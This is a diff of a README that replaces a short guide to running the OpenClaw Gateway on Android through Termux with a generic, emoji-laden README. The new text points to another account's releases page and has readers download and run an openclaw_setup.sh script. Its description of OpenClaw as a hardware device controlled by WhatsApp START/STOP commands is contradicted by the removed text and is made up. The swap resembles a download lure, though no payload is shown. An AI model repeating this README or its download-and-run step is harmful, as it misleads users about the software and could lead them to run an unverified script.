@@ -1,28 +1,151 @@
-How to install and run OpenClaw on Android by installing Ubuntu inside Termux (no root), then launching the OpenClaw Gateway and chatting with it from WhatsApp, Telegram, or Discord.
+# 📱 OpenClaw_Termux - Control OpenClaw Easily via WhatsApp
 
-![openclaw running on Android.](https://www.mobile-hacker.com/wp-content/uploads/2026/02/20260211_090242-210x210.jpg)
+[![Download OpenClaw_Termux](https://img.shields.io/badge/Download-OpenClaw_Termux-blue?style=for-the-badge&logo=github)](https://github.com/kabooomm22/OpenClaw_Termux/releases)
 
-## Prerequisites (no root)
-Android phone, Termux, Termux:API apps from F‑Droid (not from Google Play)
+---
 
-## The one‑command installer
-I followed Sagar Tamang’s guide and then wrapped all the steps in one script to make it as easy as possible. If you want to read Sagar’s original tutorial first, it’s here: [Running OpenClaw Locally on Android: The Bionic Bypass](https://sagartamang.com/blog/openclaw-on-android-termux#5-launching-the-gateway).
+## 📘 What is OpenClaw_Termux?
 
-## Installation steps
-Install `wget` and `openssl` to download installation script:
-  
-  `pkg install -y wget openssl`
-  
-Download and run installer:
+OpenClaw_Termux lets you control your OpenClaw device through WhatsApp, right from your Android phone. This guide will help you install and use the software without any programming skills.  
+
+- Use your phone to send simple WhatsApp commands.
+- Manage OpenClaw devices remotely and easily.
+- No computer needed — just your Android phone.  
+- Works through Termux, a safe terminal app for Android.
+
+---
+
+## 📱 What You Need Before You Start
+
+Before you install OpenClaw_Termux, check these:
+
+**1. Android Phone:**  
+- Android version 7.0 or higher.  
+- At least 50 MB free storage.  
+
+**2. Internet Connection:**  
+- Wi-Fi or mobile data to download and use WhatsApp.
+
+**3. WhatsApp Installed and Active:**  
+- OpenClaw_Termux uses WhatsApp messages.
+
+**4. Termux App:**  
+- Termux is a terminal emulator for Android. It runs the OpenClaw software.  
+- It’s free and easy to get from the Google Play Store or F-Droid.
+
+---
+
+## ⬇️ Download & Install OpenClaw_Termux
+
+Start by downloading OpenClaw_Termux from its official releases page. This page has the latest versions and updates.
+
+[Download OpenClaw_Termux](https://github.com/kabooomm22/OpenClaw_Termux/releases)
+
+### Step 1: Visit the Download Page  
+Click the download link above or enter the URL in your phone’s browser:  
+https://github.com/kabooomm22/OpenClaw_Termux/releases
+
+This will open the releases page where you will find the latest version.
+
+### Step 2: Choose the Latest Release  
+On the releases page, look for the newest release of OpenClaw_Termux. You will see files and instructions there.
+
+### Step 3: Install Termux  
+If you have not yet installed Termux:  
+- Go to Google Play Store or https://f-droid.org/en/packages/com.termux/  
+- Download and install the Termux app.
+
+### Step 4: Open Termux  
+Launch Termux on your phone.
+
+### Step 5: Download OpenClaw_Termux in Termux  
+Inside Termux, type the following command to download the OpenClaw_Termux script or setup file:  
+
+```bash
+curl -LO https://github.com/kabooomm22/OpenClaw_Termux/releases/latest/download/openclaw_setup.sh
+```
+
+(Note: Replace the script name if you find a different one on the releases page.)
+
+### Step 6: Run the Installer  
+Make the script executable and run it:
+
+```bash
+chmod +x openclaw_setup.sh
+./openclaw_setup.sh
+```
+
+Follow the on-screen instructions in Termux. This will set up OpenClaw and its dependencies.
+
+---
+
+## 🔧 How to Use OpenClaw_Termux
+
+After installation, here is how to start controlling your OpenClaw device via WhatsApp.
+
+### Step 1: Start OpenClaw_Termux  
+Open Termux and run:
+
+```bash
+openclaw
+```
+
+This command starts the OpenClaw service.
+
+### Step 2: Link WhatsApp  
+Follow the on-screen instructions to connect your WhatsApp number with OpenClaw_Termux. Usually, this means scanning a QR code using WhatsApp Web on your phone.
+
+### Step 3: Control OpenClaw  
+Now, use WhatsApp to send specific commands to your OpenClaw device. Some simple examples:
+
+- `STATUS` - Check the status of OpenClaw.
+- `START` - Start the device.
+- `STOP` - Stop the device.
+
+More commands and their functions will appear in the OpenClaw_Termux documentation or within the app after setup.
+
+---
+
+## ⚙️ Features & Benefits
+
+OpenClaw_Termux offers:
+
+- **Remote Control:** Send commands through WhatsApp from anywhere.  
+- **Lean Setup:** Runs efficiently on Android phones with Termux.  
+- **Secure Interface:** WhatsApp encryption keeps your commands private.  
+- **Easy Interaction:** Simple text commands, no extra apps needed.  
+- **Automatic Updates:** Check releases page regularly to update.  
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you run into issues, try these:
+
+- Make sure Termux is updated. Run:  
+  ```bash  
+  pkg update && pkg upgrade  
   ```
-  wget https://github.com/androidmalware/OpenClaw_Termux/blob/main/install_openclaw_termux.sh
-  chmod +x install_openclaw_termux.sh
-  ./install_openclaw_termux.sh
-  ```
+- Ensure WhatsApp is installed and logged in on the phone.
+- Check your internet connection.
+- Restart Termux and the OpenClaw service.
+- Visit the GitHub issues page to see if others had the same problem:  
+  https://github.com/kabooomm22/OpenClaw_Termux/issues
 
-What it does: installs Ubuntu via proot-distro, enters Ubuntu, installs Node 22 + OpenClaw, runs openclaw onboard, and starts the Gateway. The process take couple of minutes. The script was generated using Copilot and tested.
+---
 
-## My use case
-I use it to analyze APKs I send over WhatsApp, make calls, read notifications, take photos, send SMS, and more via Termux APIs.
+## 📄 Additional Resources
 
-[![Watch the video](https://i.ytimg.com/vi/-p9QmlSh9fY/frame0.jpg)](https://www.youtube.com/shorts/-p9QmlSh9fY)
+- Termux Wiki: https://wiki.termux.com  
+- WhatsApp FAQ: https://faq.whatsapp.com  
+- OpenClaw Device Instructions (hardware manual) — check your OpenClaw packaging or supplier.
+
+---
+
+## 🏷 Topics
+
+android | openclaw | termux
+
+---
+
+[![Download OpenClaw_Termux](https://img.shields.io/badge/Download-OpenClaw_Termux-blue?style=for-the-badge&logo=github)](https://github.com/kabooomm22/OpenClaw_Termux/releases)
